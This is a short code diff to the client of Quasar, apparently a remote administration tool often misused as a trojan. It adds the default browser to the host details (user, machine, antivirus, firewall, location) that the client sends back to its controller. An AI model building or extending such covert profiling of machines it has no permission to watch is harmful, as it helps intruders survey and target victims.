@@ -40,12 +40,13 @@ namespace Quasar.Client.Messages
 
                 var geoInfo = GeoInformationFactory.GetGeoInformation();
                 var userAccount = new UserAccount();
+                string defaultBrowser = SystemHelper.GetDefaultBrowser();
 
                 List<Tuple<string, string>> lstInfos = new List<Tuple<string, string>>
                 {
                     new Tuple<string, string>("Processor (CPU)", HardwareDevices.CpuName),
                     new Tuple<string, string>("Memory (RAM)", $"{HardwareDevices.TotalPhysicalMemory} MB"),
-                    new Tuple<string, string>("Video Card (GPU)", HardwareDevices.GpuName),
+                    new Tuple<string, string>("Video Card (GPU)", HardwareDevices.GpuNames),
                     new Tuple<string, string>("Username", userAccount.UserName),
                     new Tuple<string, string>("PC Name", SystemHelper.GetPcName()),
                     new Tuple<string, string>("Domain Name", domainName),
@@ -61,7 +62,8 @@ namespace Quasar.Client.Messages
                     new Tuple<string, string>("Antivirus", SystemHelper.GetAntivirus()),
                     new Tuple<string, string>("Firewall", SystemHelper.GetFirewall()),
                     new Tuple<string, string>("Time Zone", geoInfo.Timezone),
-                    new Tuple<string, string>("Country", geoInfo.Country)
+                    new Tuple<string, string>("Country", geoInfo.Country),
+                    new Tuple<string, string>("Main Browser", defaultBrowser)
                 };
 
                 client.Send(new GetSystemInfoResponse { SystemInfos = lstInfos });
